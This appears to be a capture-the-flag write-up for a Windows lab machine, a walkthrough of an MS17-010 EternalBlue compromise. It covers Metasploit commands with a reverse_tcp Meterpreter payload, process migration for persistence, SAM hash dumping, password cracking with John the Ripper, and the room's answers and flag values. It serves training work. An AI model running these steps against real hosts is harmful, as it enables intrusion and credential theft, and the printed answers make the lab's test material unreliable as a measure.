<img width="512" height="288" alt="image" src="https://github.com/user-attachments/assets/3c386074-4910-4fe4-a27e-8b4528f58eba" />

### 1. Reconnaissance & Vulnerability Scanning
To discover open services and potential vulnerabilities on the target host (`10.48.136.21`), I performed a service version and vulnerability scan using Nmap:

```bash
nmap -sV -sC --script vuln -oN blue.nmap 10.48.136.21
```
---

## 🎯 Task Questions & Answers

| Question | Answer |
| :--- | :--- |
| **How many ports are open with a port number under 1000?** | `3` |
| **What is this machine vulnerable to?** | `ms17-010` |

<img width="512" height="218" alt="image" src="https://github.com/user-attachments/assets/9b0a8d6c-21fc-4499-8a45-0e62d2267bdc" />
### 2. Exploitation Phase

#### Step 1: Searching for the Exploit Module
Launched the Metasploit Framework (`msfconsole`) and searched for the EternalBlue vulnerability exploit modules:

```bash
msf > search eternalblue
Result: Identified the primary exploit module:

exploit/windows/smb/ms17_010_eternalblue
```
<img width="512" height="231" alt="image" src="https://github.com/user-attachments/assets/57aa1f7e-c81a-4163-bf51-de0ccf85c652" />

#### Step 2: Selecting Module & Setting Target IP
Selected the EternalBlue exploit module, checked options, and configured the target host IP:

```bash
msf > use 0
msf exploit(windows/smb/ms17_010_eternalblue) > show options
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.48.136.21
```
Configuration Analysis:

Default Payload: Automatically selected windows/x64/meterpreter/reverse_tcp.

Target IP Configured: Set RHOSTS to 10.48.136.21.

<img width="512" height="172" alt="image" src="https://github.com/user-attachments/assets/59aeda47-1e02-46d2-9d22-c94acda26ffa" />

#### Step 3: Executing Exploit & Gaining Access
Executed the exploit module to compromise the target system:

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > run
```
Execution Output Analysis:

Vulnerability Check: Verified that the target (10.48.136.21) is running Windows Server 2012 R2 and is vulnerable to MS17-010.

Session Established: Successfully sent the shellcode stage and opened Meterpreter session 1 (10.48.98.80:4444 -> 10.48.136.21:49437).
---

## 🎯 Task Questions & Answers (Exploitation)

| Question | Answer |
| :--- | :--- |
| **Find the exploitation code we will run against the machine. What is the full path of the code?** | `exploit/windows/smb/ms17_010_eternalblue` |
| **Show options and set the one required value. What is the name of this value?** | `RHOSTS` |

<img width="512" height="229" alt="image" src="https://github.com/user-attachments/assets/a6388d9b-a970-42bd-b4c7-ec82976c7c5a" />

### 3. Post-Exploitation & Session Management

#### Step 1: Backgrounding Session & Module Selection
After gaining access, the active session was moved to the background to run post-exploitation modules:

```bash
meterpreter > background
msf exploit(windows/smb/ms17_010_eternalblue) > sessions
msf exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
```
Execution Analysis:

Active Sessions: Verified active Meterpreter session (ID 1) running as NT AUTHORITY\SYSTEM.

Post Module Selected: Loaded post/multi/manage/shell_to_meterpreter to demonstrate shell upgrading techniques.

> 💡 **Note on Target IP Address:**
> During the lab session, the target machine was restarted due to a network connection timeout, which resulted in a new IP address assignment (`10.48.xxx.xxx`). The technical methodology, commands, and exploitation steps remain identical.

<img width="1349" height="370" alt="image" src="https://github.com/user-attachments/assets/3ff7cd63-3f82-47c8-960c-b81f5ce3ad5f" />

<img width="1350" height="458" alt="image" src="https://github.com/user-attachments/assets/7e39c45a-989f-4e0e-86ef-ad2454d4ab9c" />

### 3. Post-Exploitation: Upgrading Shell to Meterpreter

To demonstrate session elevation, the post-exploitation module `post/multi/manage/shell_to_meterpreter` was used to convert the basic shell session into a full Meterpreter shell:

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf post(multi/manage/shell_to_meterpreter) > show options
msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf post(multi/manage/shell_to_meterpreter) > run
msf post(multi/manage/shell_to_meterpreter) > sessions
```
Execution Analysis:

Configuration: Loaded the shell-to-meterpreter post module and assigned the target active session using set SESSION 1.

Execution & Session Creation: Ran the module, successfully establishing Meterpreter session 2 on port 4433.

Session Verification: Executed sessions to confirm both active sessions, verifying high-privilege access (NT AUTHORITY\SYSTEM).

<img width="1364" height="621" alt="image" src="https://github.com/user-attachments/assets/1af33933-5e02-4792-bc86-f2271bd4a0c7" />

#### Step 3: Privilege & Shell Verification
Interacted with the elevated Meterpreter session and confirmed full System-level access:

```bash
msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
meterpreter > getuid
meterpreter > shell
C:\Windows\system32> whoami
```
Output Verification:

Meterpreter Check: getuid returned Server username: NT AUTHORITY\SYSTEM.

Command Prompt Check: Dropped into Windows CMD shell via shell and executed whoami, confirming nt authority\system.

<img width="1365" height="599" alt="image" src="https://github.com/user-attachments/assets/a353de6a-70c0-4f63-970b-4efb06c525a4" />

#### Step 4: Process Migration for System Stability
Initial exploitation often leaves the session running under an unstable or temporary process architecture. To secure high stability and persistence under `NT AUTHORITY\SYSTEM`, the Meterpreter session was migrated to a native 64-bit Windows process (`spoolsv.exe`):

```bash
meterpreter > ps
meterpreter > migrate 592
```
Execution Analysis:

Initial Process: Session was initially running under powershell.exe (PID: 1916).

Migration Target: Executed migrate 592 to transfer the process to spoolsv.exe (PID: 592), a core x64 system service running under NT AUTHORITY\SYSTEM.

Result: Successfully completed process migration (Migration completed successfully), ensuring an active, stable, and persistent Meterpreter session.

---

## 🎯 Task Questions & Answers (Shell Upgrade)

| Question | Answer |
| :--- | :--- |
| **Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use?** | `post/multi/manage/shell_to_meterpreter` |
| **Show options, what option are we required to change?** | `SESSION` |

---

<img width="1365" height="626" alt="image" src="https://github.com/user-attachments/assets/30a57d74-56f9-48c2-90db-22a9c4f87966" />

4. Credential Dumping & Cracking
Step 1: Dumping NTLM Hashes (hashdump)
After securing a stable NT AUTHORITY\SYSTEM session with Meterpreter, the SAM database was dumped to extract local user password hashes:
```bash
meterpreter > hashdump
```
Dumping Analysis:Extracted NTLM hashes for local accounts including Administrator, Guest, and Jon.   Identified the non-default user Jon with NLM Hash:Jon:1002:aad3b435b1404eeaad3b435b1404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

Step 2: Cracking Hashes with John the RipperSaved Jon's NTLM hash into a text file (jon.hash) and cracked it using John the Ripper against the rockyou.txt wordlist:

```bash
# Saved Jon's NTLM hash into jon.hash
john jon.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
john jon.hash --format=NT --show
```
Cracking Analysis:
Hash Format Specified: Forced NT hash format (--format=NT).
Wordlist Used: Utilized rockyou.txt for brute-force dictionary attack.
Cracked Result: Successfully cracked the NTLM hash for user Jon:   
Username: Jon   
Password: alqfna22

---

## 🎯 Task Questions & Answers (Hash Dumping & Cracking)

| Question | Answer |
| :--- | :--- |
| **What is the name of the non-default user?** | `Jon` |
| **What is the cracked password?** | `alqfna22` |

<img width="1365" height="598" alt="image" src="https://github.com/user-attachments/assets/1ba8f0d5-55fe-40fb-9f87-bcc8ec09209c" />
### 5. Finding the Flags

#### Flag 1: System Root (`C:\`)
Navigated to the root directory `C:\` and displayed the contents of the first flag file:

```bash
meterpreter > cd ..
meterpreter > ls
meterpreter > cat flag1.txt
```
Flag Finding:

Location: C:\flag1.txt

Value: flag{access_the_machine}

<img width="1363" height="620" alt="image" src="https://github.com/user-attachments/assets/342e0c94-84c6-4072-af21-ae4e0e000624" />

#### Flag 2: Windows System Config (`C:\Windows\System32\config`)
Navigated to the sensitive Windows configuration directory where password SAM hashes are stored, and retrieved the second flag:

```bash
meterpreter > cd C:\\Windows\\System32\\config
meterpreter > pwd
meterpreter > cat flag2.txt
```
Flag Finding:

Location: C:\Windows\System32\config\flag2.txt

Value: flag{sam_database_elevated_access}

#### Flag 3: User Documents Directory (`C:\Users\Jon\Documents`)
Navigated to the non-default user Jon's Documents directory to retrieve the final flag:

```bash
meterpreter > cd "C:\\Users\\Jon\\Documents"
meterpreter > cat flag3.txt
```
Flag Finding:

Location: C:\Users\Jon\Documents\flag3.txt

Value: flag{admin_documents_clearance}

that's it!
